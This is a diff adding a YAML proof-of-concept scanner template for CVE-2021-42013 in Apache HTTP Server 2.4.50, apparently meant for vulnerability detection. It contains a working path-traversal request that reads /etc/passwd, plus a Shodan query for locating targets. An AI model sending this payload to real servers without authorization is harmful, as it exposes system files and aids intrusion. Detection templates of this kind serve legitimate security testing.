@@ -1,0 +1,24 @@
+id: poc-yaml-apache-http-server-2-4-50-rce
+info:
+  name: Apache HTTP Server 2.4.50 远程代码执行漏洞(CVE-2021-42013)
+  severity: critical
+  tags:
+  - 两高一弱
+  - rce
+  - CVE-2021-42013
+  finger: apache
+  shodan: Apache 2.4.50
+requests:
+- method: GET
+  path: /icons/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+  expression: 'status_code == 200
+
+    && contains(body,"root:")
+
+    && contains(body,"/bin")
+
+    && !contains(body,"<")
+
+    '
+variables: {}
+transport: http
